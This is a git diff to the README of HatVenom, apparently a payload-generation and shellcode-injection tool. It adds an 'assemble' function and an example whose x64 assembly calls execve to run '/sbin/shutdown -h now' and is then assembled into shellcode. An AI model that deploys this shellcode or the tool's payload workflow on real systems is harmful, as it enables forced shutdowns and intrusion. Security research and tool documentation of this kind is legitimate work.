@@ -28,10 +28,47 @@ pip3 install git+https://github.com/EntySec/HatVenom
 
 ## Basic functions
 
-There are all HatVenom basic functions that can be used to generate payload, covert data or inject shellcode.
+There are all HatVenom basic functions that can be used to generate payload, covert data, assemble code or inject shellcode.
 
+* `assemble(code, arch)` - Generate byte code for specified target from specified code.
 * `generate(file_format, arch, shellcode, offsets={})` - Generates payload for specified target and with specified shellcode.
 * `generate_to(file_format, arch, shellcode, offsets={}, filename='a.out')` - Generates payload for specified target and with specified shellcode and saves it to the specified file.
+
+## Assembling code
+
+It's very easy to assemble code for various targets in HatVenom. Let's assemble a simple code that calls shutdown for Linux.
+
+```python
+from hatvenom import HatVenom
+
+code = (
+    "xor rax, rax;"
+    "xor rdx, rdx;"
+    "push rax;"
+    "push 0x77;"
+    "push 0x6f6e;"
+    "mov rbx, rsp;"
+    "push rax;"
+    "push 0x682d;"
+    "mov rcx, rsp;"
+    "push rax;"
+    "movabs r8, 0x2f2f2f6e6962732f;"
+    "movabs r10, 0x6e776f6474756873;"
+    "push r10;"
+    "push r8;"
+    "mov rdi, rsp;"
+    "push rdx;"
+    "push rbx;"
+    "push rcx;"
+    "push rdi;"
+    "mov rsi, rsp;"
+    "add rax, 0x3b;"
+    "syscall"
+)
+
+hatvenom = HatVenom
+shellcode = hatvenom.assemble(code, 'x64')
+```
 
 ## Generating payload
 
